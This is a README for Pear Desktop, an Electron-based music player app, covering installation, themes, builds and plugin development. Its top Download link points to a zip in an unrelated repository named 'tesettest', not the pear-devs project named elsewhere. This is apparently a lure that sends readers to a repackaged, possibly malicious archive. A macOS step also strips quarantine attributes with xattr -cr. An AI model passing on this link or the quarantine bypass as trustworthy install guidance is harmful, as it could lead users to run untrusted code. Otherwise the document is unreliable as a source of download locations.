# Pear Desktop — Music Player Desktop Extension

Pear Desktop is a desktop extension for a music player, focused on providing a native-feeling app experience with configurable visual tweaks, plugin support, and cross-platform packaging.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/pear-desktop.zip)

Pear Desktop is intended for users who want a dedicated desktop environment instead of relying only on a browser tab. It includes support for custom themes, internal plugins, and development workflows for building, testing, and packaging the app on major desktop platforms.

> Pear Desktop is an independent, volunteer-built project. It is not affiliated with, endorsed by, or officially connected with Google, YouTube, or YouTube Music.

## What Pear Desktop Provides

Pear Desktop wraps a music player experience in a desktop application and adds options that are useful for daily desktop use.

Key areas include:

- A native desktop-style interface
- Custom CSS themes through the app settings
- Plugin support for extending behavior
- Development and build scripts using `pnpm`
- Packaging targets for Windows, Linux, and macOS
- Playwright-based test support
- Translation support through a hosted translation workflow

The project is suitable for users who prefer a standalone music app window and for developers who want to customize or extend the desktop experience.

## Platform Availability

Pear Desktop provides installation or packaging paths for several operating systems.

| Platform | Available path |
| --- | --- |
| Arch Linux | AUR package |
| Solus | `eopkg` package |
| macOS | Homebrew cask or manual app install |
| Windows | Scoop, Winget, or manual installer |
| Linux builds | Debian, Fedora, and general Linux build targets are available through project scripts |

Package availability may vary by platform and distribution.

## Installation Notes

### Arch Linux

Pear Desktop is available through the AUR as:

```bash
pear-desktop
```

Use your preferred AUR workflow to install it.

### Solus

On Solus, install the package with:

```bash
sudo eopkg install pear-desktop
```

### macOS

Pear Desktop can be installed with Homebrew:

```bash
brew install pear-devs/pear/pear-desktop
```

If a manually installed macOS app cannot be opened because macOS marks it as damaged, remove extended attributes with:

```bash
/usr/bin/xattr -cr /Applications/Pear\ Desktop.app
```

### Windows

Pear Desktop can be installed with Scoop from the `extras` bucket:

```bash
scoop bucket add extras
scoop install extras/pear-desktop
```

It can also be installed with Winget:

```bash
winget install pear-devs.pear-desktop
```

Windows may show a SmartScreen warning because the app can appear as coming from an unrecognized publisher.

### Windows Offline Installer Notes

For installation without an active network connection:

1. Download the installer for Pear Desktop.
2. Download the matching `*.nsis.7z` file for the device architecture:
   - `x64` for 64-bit Windows
   - `ia32` for 32-bit Windows
   - `arm64` for ARM64 Windows
3. Put both files in the same folder.
4. Run the installer.

## Themes and Visual Customization

Pear Desktop supports CSS-based themes. Theme files can be loaded from the application settings under:

```text
Options > Visual Tweaks > Themes
```

This makes it possible to adjust the appearance of the desktop app without changing the core application code.

## Translation

Pear Desktop supports community translation through a hosted translation platform. Contributors can help improve language coverage and text quality for the app interface.

## Development Setup

Pear Desktop uses `pnpm` for dependency management and development scripts.

Clone the repository, install dependencies, and start the development app:

```bash
git clone https://github.com/pear-devs/pear-desktop
cd pear-desktop
pnpm install --frozen-lockfile
pnpm dev
```

A devcontainer workflow is also supported. This can be used through compatible editors such as VS Code or as an isolated environment for building the project without installing all dependencies directly on the host system.

Some graphical desktop behavior may be limited depending on the host operating system and container environment.

## Building Pear Desktop

Install dependencies first:

```bash
pnpm install --frozen-lockfile
```

Then run the build command for the target platform.

| Target | Command |
| --- | --- |
| Windows | `pnpm dist:win` |
| Linux amd64 | `pnpm dist:linux` |
| Linux Debian arm64 | `pnpm dist:linux:deb-arm64` |
| Linux Fedora arm64 | `pnpm dist:linux:rpm-arm64` |
| macOS amd64 | `pnpm dist:mac` |
| macOS arm64 | `pnpm dist:mac:arm64` |

The project uses Electron Builder for desktop packaging.

### Devcontainer Build Flow

A typical devcontainer build workflow is:

1. Clone the repository.
2. Open the folder in VS Code.
3. Reopen the project in the container when prompted.
4. Run the desired build command.
5. Collect generated files from the `dist` folder.

Because the workspace is mounted into the container, generated build output is available from the host system as well.

## Production Preview

To run a production preview:

```bash
pnpm start
```

## Tests

Run the test suite with:

```bash
pnpm test
```

Pear Desktop uses Playwright for application testing.

## Plugin Development

Pear Desktop includes a plugin system for extending the desktop app. Plugins can add styles, menu items, renderer behavior, backend behavior, and preload behavior.

A plugin can be used to:

- Add custom CSS
- Adjust the rendered interface
- Add menu entries
- Communicate between app layers through Electron IPC
- React to configuration changes

Plugins are created inside:

```text
src/plugins/YOUR-PLUGIN-NAME
```

A plugin usually includes an `index.ts` file and may include CSS or other supporting files.

### Example Plugin Shape

```typescript
import style from './style.css?inline';

import { createPlugin } from '@/utils';

export default createPlugin({
  name: 'Plugin Label',
  restartNeeded: true,
  config: {
    enabled: false,
  },
  stylesheets: [style],
  renderer: {
    start() {
      console.log('plugin started');
    },
  },
});
```

### Common Plugin Uses

For a visual-only plugin, import a CSS file as an inline stylesheet and register it through `stylesheets`.

For interface behavior, define renderer hooks and add code that runs inside the rendered app context.

For app-level behavior, define backend hooks. These can interact with the Electron window and app-side events.

## Practical Use Cases

Pear Desktop may be useful if you want to:

- Keep your music player in a dedicated desktop window
- Apply a custom visual theme
- Build small extensions for a desktop music app
- Package the app for a supported operating system
- Contribute translations or test coverage
- Experiment with Electron-based desktop customization

## Independence and Trademark Notice

Pear Desktop is an independent desktop extension project. Names and marks related to Google, YouTube, and YouTube Music belong to their respective owners. References to those services are used only to identify compatibility and context.

The application is provided as-is. Users are responsible for deciding whether it is suitable for their own environment.

## FAQ

### Is Pear Desktop an official Google or YouTube Music app?

No. Pear Desktop is an independent project and is not officially connected with Google, YouTube, or YouTube Music.

### Can I change the appearance of the app?

Yes. CSS themes can be loaded through the visual theme settings inside the app.

### Can developers add new behavior?

Yes. Pear Desktop includes a plugin system with hooks for renderer, backend, and preload contexts.

### How do I show the app menu if it is hidden?

If the menu is hidden, press <kbd>Alt</kbd>. If using the in-app menu plugin, the backtick key may also be used.

## License

Pear Desktop is released under the MIT License.
